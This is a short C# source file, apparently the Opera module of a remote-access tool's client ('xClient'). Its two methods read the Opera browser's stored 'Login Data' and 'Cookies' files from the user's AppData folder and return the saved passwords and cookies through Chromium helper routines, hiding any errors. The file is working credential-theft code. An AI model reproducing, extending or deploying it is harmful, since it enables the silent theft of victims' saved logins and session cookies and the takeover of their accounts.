using System;
using System.Collections.Generic;
using System.IO;
using xClient.Core.Data;
using xClient.Core.Recovery.Utilities;
using xClient.Core.Utilities;

namespace xClient.Core.Recovery.Browsers
{
    public class Opera
    {
        public static List<RecoveredAccount> GetSavedPasswords()
        {
            try
            {
                string datapath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                "Opera Software\\Opera Stable\\Login Data");
                return ChromiumBase.Passwords(datapath, "Opera");
            }
            catch (Exception)
            {
                return new List<RecoveredAccount>();
            }
        }

        public static List<ChromiumBase.ChromiumCookie> GetSavedCookies()
        {
            try
            {
                string datapath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                "Opera Software\\Opera Stable\\Cookies");
                return ChromiumBase.Cookies(datapath, "Opera");
            }
            catch (Exception)
            {
                return new List<ChromiumBase.ChromiumCookie>();
            }
        }

       
    }
}
